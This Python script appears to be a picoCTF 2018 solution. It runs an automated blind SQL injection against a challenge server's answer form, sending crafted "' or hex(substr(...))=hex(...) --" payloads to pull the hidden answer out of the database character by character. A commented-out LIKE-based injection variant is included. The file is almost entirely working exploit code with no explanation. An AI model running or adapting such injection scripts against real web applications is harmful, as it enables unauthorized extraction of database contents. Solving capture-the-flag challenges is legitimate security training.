#!/usr/bin/env python
# -*- coding: utf-8 -*-


import requests

from string import ascii_letters, digits
flag = ''
burp0_url = "http://2018shell2.picoctf.com:32635/answer2.php"
burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                 "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Pragma": "no-cache", "Cache-Control": "no-cache"}
for j in range(1, 99):
    for i in digits+ascii_letters:
        cnt = j
        burp0_data = {
            "answer": "1' or hex(substr((select answer from answers limit 1 offset 0),{},1))=hex('{}') -- ".format(j, i)
            # "answer":"1' or (select answer from answers where answer like '{}%') -- ".format(flag+i)
        }
        r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
        if 'You' in r.content:
            flag = flag + i
            print(flag)
            cnt += 1
            break
    if cnt == j:
        break
print(flag)